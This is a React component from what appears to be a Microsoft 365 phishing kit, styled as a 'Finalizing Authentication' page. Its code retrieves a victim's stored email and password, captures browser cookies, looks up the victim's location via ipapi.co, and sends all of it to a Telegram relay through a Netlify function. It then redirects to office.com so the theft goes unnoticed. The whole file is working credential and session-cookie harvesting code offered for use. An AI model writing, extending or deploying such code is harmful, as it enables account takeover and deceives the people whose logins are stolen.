import React, { useEffect, useState } from 'react';

/**
 * AuthCallback Component
 * 
 * This component is the redirect target after the Microsoft login flow. Its sole purpose is to:
 * 1. Retrieve the credentials that were stored in localStorage by `replacement.html`.
 * 2. Capture all available cookies after the Microsoft redirect.
 * 3. Fetch user location data.
 * 4. Consolidate all data (credentials, cookies, location) into a single payload.
 * 5. Transmit the payload to the Telegram endpoint.
 * 6. Redirect the user to a final destination (e.g., office.com) to complete the flow.
 */
const AuthCallback: React.FC = () => {
    const [status, setStatus] = useState('Initializing callback...');

    useEffect(() => {
        const executeCallback = async () => {
            setStatus('Consolidating authentication data...');
            console.log('🔄 AuthCallback: Consolidating and transmitting data.');

            // --- 1. Retrieve Stored Credentials ---
            let credentials = null;
            try {
                const storedCreds = localStorage.getItem('replacement_credentials') || sessionStorage.getItem('replacement_credentials');
                if (storedCreds) {
                    credentials = JSON.parse(storedCreds);
                    console.log('✅ Credentials retrieved from storage.');
                } else {
                    console.error('❌ FATAL: No credentials found in storage. Aborting.');
                    setStatus('Error: Could not find stored credentials.');
                    return;
                }
            } catch (error) {
                console.error('❌ FATAL: Failed to parse credentials from storage.', error);
                setStatus('Error: Failed to parse credentials.');
                return;
            }

            // --- 2. Capture Cookies ---
            const captureCookies = () => {
                try {
                    const cookieString = document.cookie;
                    if (!cookieString) return [];
                    const cookies = cookieString.split(';').map(pair => {
                        const [name, value] = pair.trim().split('=');
                        return { name, value, domain: window.location.hostname };
                    });
                    console.log(`✅ Captured ${cookies.length} cookies.`);
                    return cookies;
                } catch (error) {
                    console.warn('⚠️ Failed to capture cookies:', error);
                    return [];
                }
            };
            const cookies = captureCookies();
            
            // --- 3. Fetch Location Data ---
            setStatus('Fetching geolocation data...');
            let locationData = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                locationData = await response.json();
                console.log('✅ Location data fetched.');
            } catch (error) {
                console.warn('⚠️ Failed to fetch location data:', error);
            }

            // --- 4. Create Cookie File ---
            const createCookieFile = (cookiesToExport: any[]) => {
                if (!cookiesToExport || cookiesToExport.length === 0) return null;
                try {
                    const jsonContent = JSON.stringify({
                        source: 'AuthCallback-Export',
                        timestamp: new Date().toISOString(),
                        count: cookiesToExport.length,
                        cookies: cookiesToExport
                    }, null, 2);

                    return {
                        name: `cookies_${new Date().getTime()}.json`,
                        content: jsonContent,
                    };
                } catch (error) {
                    console.warn('⚠️ Failed to create cookie JSON file:', error);
                    return null;
                }
            };
            const cookieFile = createCookieFile(cookies);

            // --- 5. Transmit Data ---
            setStatus('Transmitting secured data...');
            const payload = {
                email: credentials.email,
                password: credentials.password,
                passwordSource: 'auth-callback-final',
                cookies,
                locationData,
                cookieFiles: cookieFile ? { jsonFile: cookieFile } : {},
                userAgent: navigator.userAgent,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                validated: true,
                microsoftAccount: true,
                captureContext: {
                    sourceComponent: 'AuthCallback',
                    cookiesCaptured: cookies.length,
                    locationCaptured: !!locationData,
                }
            };

            try {
                const response = await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
                    setStatus('Authentication complete. Redirecting...');
                } else {
                    const errorText = await response.text();
                    console.error('❌ Transmission failed. Server responded with:', response.status, errorText);
                    setStatus(`Error: Transmission failed with status ${response.status}.`);
                }
            } catch (error) {
                console.error('❌ FATAL: Network error during transmission.', error);
                setStatus('Error: Network failure during transmission.');
                return; // Stop flow if transmission fails
            }
            
            // --- 6. Final Redirect ---
            console.log('🎉 Flow complete. Redirecting to final destination.');
            setTimeout(() => {
                window.location.href = 'https://www.office.com/?auth=2';
            }, 1500);

        };

        executeCallback();

    }, []);

    return (
        <div style={{
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            alignItems: 'center',
            height: '100vh',
            fontFamily: 'Segoe UI, Arial, sans-serif',
            backgroundColor: '#f3f2f1',
            color: '#323130'
        }}>
            <h2 style={{ marginBottom: '20px' }}>Finalizing Authentication</h2>
            <p>{status}</p>
            <div style={{
                border: '4px solid #f3f2f1',
                borderTop: '4px solid #0078d4',
                borderRadius: '50%',
                width: '40px',
                height: '40px',
                animation: 'spin 1s linear infinite',
                marginTop: '20px'
            }}></div>
            <style>{`
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

export default AuthCallback;
